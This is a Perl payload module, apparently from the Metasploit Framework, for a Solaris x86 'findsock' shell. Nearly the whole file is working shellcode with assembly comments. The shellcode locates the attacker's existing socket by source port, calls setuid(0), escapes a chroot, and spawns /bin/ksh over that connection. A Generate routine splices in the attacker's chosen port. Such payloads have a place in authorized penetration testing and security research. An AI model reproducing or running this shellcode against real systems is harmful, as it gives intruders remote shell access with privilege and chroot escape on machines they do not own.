
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::solaris_ia32_findsock;
use strict;
use base 'Msf::PayloadComponent::FindConnection';

my $info =
{
  'Name'         => 'Solaris IA32 SrcPort Findsock Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Spawn a shell on the established connection',
  'Authors'      => [ 'LSD [Unknown License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'solaris' ],
  'Size'         => '',
  'UserOpts'     =>
    {
      'CPORT' => [1, 'PORT', 'Local port used by exploit'],
    }
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('CPORT')));
}

sub Generate {
  my $self = shift;
  my $port = shift;
  my $off_port = 39;
  my $port_bin = pack('n', $port);

  my $shellcode = # solaris findsock code by lsd
  # char findsckcode[]=    # /* 67 bytes                       */
  "\x56"                 . # /* pushl   %esi                   */
  "\x5f"                 . # /* popl    %edi                   */
  "\x83\xef\x7c"         . # /* subl    $0x7c,%edi             */
  "\x57"                 . # /* pushl   %edi                   */
  "\x8d\x4f\x10"         . # /* leal    0x10(%edi),%ecx        */
  "\xb0\x91"             . # /* movb    $0x91,%al              */
  "\xab"                 . # /* stosl   %eax,%es:(%edi)        */
  "\xab"                 . # /* stosl   %eax,%es:(%edi)        */
  "\x91"                 . # /* xchgl   %ecx,%eax              */
  "\xab"                 . # /* stosl   %eax,%es:(%edi)        */
  "\x95"                 . # /* xchgl   %eax,%ebp              */
  "\xb5\x54"             . # /* movb    $0x54,%ch              */
  "\x51"                 . # /* pushl   %ecx                   */
  "\x66\xb9\x01\x01"     . # /* movw    $0x0101,%cx            */
  "\x51"                 . # /* pushl   %ecx                   */
  "\x33\xc0"             . # /* xorl    %eax,%eax              */
  "\xb0\x36"             . # /* movb    $0x36,%al              */
  "\xff\xd6"             . # /* call    *%esi                  */
  "\x59"                 . # /* popl    %ecx                   */
  "\x33\xdb"             . # /* xorl    %ebx,%ebx              */
  "\x3b\xc3"             . # /* cmpl    %ebx,%eax              */
  "\x75\x0a"             . # /* jne     <findsckcode+47>       */
  "\x66\xbb\x12\x34"     . # /* movw    $0x1234,%bx            */
  "\x66\x39\x5d\x02"     . # /* cmpw    %bx,0x2(%ebp)          */
  "\x74\x02"             . # /* je      <findsckcode+49>       */
  "\xe2\xe6"             . # /* loop    <findsckcode+23>       */
  "\x6a\x09"             . # /* pushb   $0x09                  */
  "\x51"                 . # /* pushl   %ecx                   */
  "\x91"                 . # /* xchgl   %ecx,%eax              */
  "\xb1\x03"             . # /* movb    $0x03,%cl              */
  "\x49"                 . # /* decl    %ecx                   */
  "\x89\x4c\x24\x08"     . # /* movl    %ecx,0x8(%esp)         */ 
  "\x41"                 . # /* incl    %ecx                   */
  "\xb0\x3e"             . # /* movb    $0x3e,%al              */
  "\xff\xd6"             . # /* call    *%esi                  */
  "\xe2\xf4"             . # /* loop    <findsckcode+55>       */


  # char setuidcode[]=     # /* 7 bytes                        */
  "\x33\xc0"             . # /* xorl    %eax,%eax              */
  "\x50"                 . # /* pushl   %eax                   */
  "\xb0\x17"             . # /* movb    $0x17,%al              */
  "\xff\xd6"             . # /* call    *%esi                  */

  # char chrootcode[]=     # /* 40 bytes                       */
  "\x68b..."             . # /* pushl   $0x2e2e2e62            */
  "\x89\xe7"             . # /* movl    %esp,%edi              */
  "\x33\xc0"             . # /* xorl    %eax,%eax              */
  "\x88\x47\x03"         . # /* movb    %al,0x3(%edi)          */
  "\x57"                 . # /* pushl   %edi                   */
  "\xb0\x50"             . # /* movb    $0x50,%al              */
  "\xff\xd6"             . # /* call    *%esi                  */
  "\x57"                 . # /* pushl   %edi                   */
  "\xb0\x3d"             . # /* movb    $0x3d,%al              */
  "\xff\xd6"             . # /* call    *%esi                  */
  "\x47"                 . # /* incl    %edi                   */
  "\x33\xc9"             . # /* xorl    %ecx,%ecx              */
  "\xb1\xff"             . # /* movb    $0xff,%cl              */
  "\x57"                 . # /* pushl   %edi                   */
  "\xb0\x0c"             . # /* movb    $0x0c,%al              */
  "\xff\xd6"             . # /* call    *%esi                  */
  "\xe2\xfa"             . # /* loop    <chrootcode+28>        */
  "\x47"                 . # /* incl    %edi                   */
  "\x57"                 . # /* pushl   %edi                   */
  "\xb0\x3d"             . # /* movb    $0x3d,%al              */
  "\xff\xd6"             . # /* call    *%esi                  */

  # char shellcode[]=      # /* 25+8 bytes                     */
  "\xeb\x12"             . # /* jmp     <shellcode+20>         */
  "\x33\xd2"             . # /* xorl    %edx,%edx              */
  "\x58"                 . # /* popl    %eax                   */
  "\x8d\x78\x14"         . # /* leal    0x14(%eax),edi         */
  "\x57"                 . # /* pushl   %edi                   */
  "\x50"                 . # /* pushl   %eax                   */
  "\xab"                 . # /* stosl   %eax,%es:(%edi)        */
  "\x92"                 . # /* xchgl   %eax,%edx              */
  "\xab"                 . # /* stosl   %eax,%es:(%edi)        */
  "\x88\x42\x08"         . # /* movb    %al,0x8(%edx)          */
  "\xb0\x0b"             . # /* movb    $0x0b,%al              */
  "\xff\xd6"             . # /* call    *%esi                  */
  "\xe8\xe9\xff\xff\xff" . # /* call    <shellcode+2>          */
  "/bin/ksh";

  substr($shellcode, $off_port, 2, $port_bin);
  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('4444');
  return(length($bin));
}

1;
